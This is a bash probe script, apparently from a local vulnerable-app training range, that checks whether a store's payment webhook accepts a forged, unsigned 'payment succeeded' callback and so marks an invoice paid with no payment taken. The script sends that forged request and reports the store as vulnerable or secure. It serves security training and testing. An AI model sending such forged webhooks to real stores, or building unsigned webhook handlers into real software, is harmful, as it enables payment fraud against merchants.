#!/usr/bin/env bash
# VULN-WEBHOOK-01 — confirm the payment webhook accepts an UNSIGNED, forged callback,
# marking an invoice paid without payment. Local range, seeded fake data;
# reset with: docker compose down -v
set -eu
cd "$(dirname "$0")/.."
. ./_lib.sh

need curl
guard_localhost
require_store

echo "VULN-WEBHOOK-01 — will store-api accept a forged, unsigned 'payment succeeded' webhook?"
hr

token=$(login alice@duckstore.test password1)
[ -n "$token" ] || { echo "Login failed (is the range seeded?)." >&2; exit 2; }

# Place a fresh order so we have an OPEN invoice to target.
place=$(curl -s -m 10 -X POST "$STORE/api/orders" -H "Authorization: Bearer $token" -H 'Content-Type: application/json' \
    -d '{"shippingAddress":"1 Test Way","notes":"VULN-WEBHOOK-01 probe","items":[{"productId":1,"quantity":1,"unitPrice":4.99}]}')
oid=$(printf '%s' "$place" | sed -n 's/.*"orderId":\([0-9]*\).*/\1/p')
[ -n "$oid" ] || { echo "Could not place the setup order." >&2; exit 2; }

inv=$(curl -s -m 10 "$STORE/api/orders/$oid" -H "Authorization: Bearer $token" | sed -n 's/.*"invoice":{"id":\([0-9]*\).*/\1/p')
[ -n "$inv" ] || { echo "Could not read the invoice id." >&2; exit 2; }
echo "Order #$oid has open invoice #$inv. Sending a forged webhook with NO signature…"

# Forged callback — no X-Payment-Signature header.
curl -s -m 10 -o /dev/null -X POST "$STORE/api/payments/webhook" -H 'Content-Type: application/json' \
    -d "{\"InvoiceId\":$inv,\"Reference\":\"forged-by-probe\",\"Status\":\"succeeded\"}"

status=$(curl -s -m 10 "$STORE/api/orders/$oid" -H "Authorization: Bearer $token" | sed -n 's/.*"invoice":{"id":[0-9]*,"amountDue":[0-9.]*,"status":"\([^"]*\)".*/\1/p')
echo "Invoice status after the forged webhook: ${status:-<unknown>}"

if [ "$status" = "paid" ]; then
    echo "VULNERABLE: an unsigned, forged webhook marked the invoice paid (no payment taken)."
    echo "  → Flip VULN-WEBHOOK-01 to secure in Range Control and re-run; the forged webhook is rejected."
elif [ "$status" = "open" ]; then
    echo "SECURE: the unsigned webhook was rejected; the invoice is still open."
else
    echo "Unexpected status ($status). Is the range running and seeded?"
fi
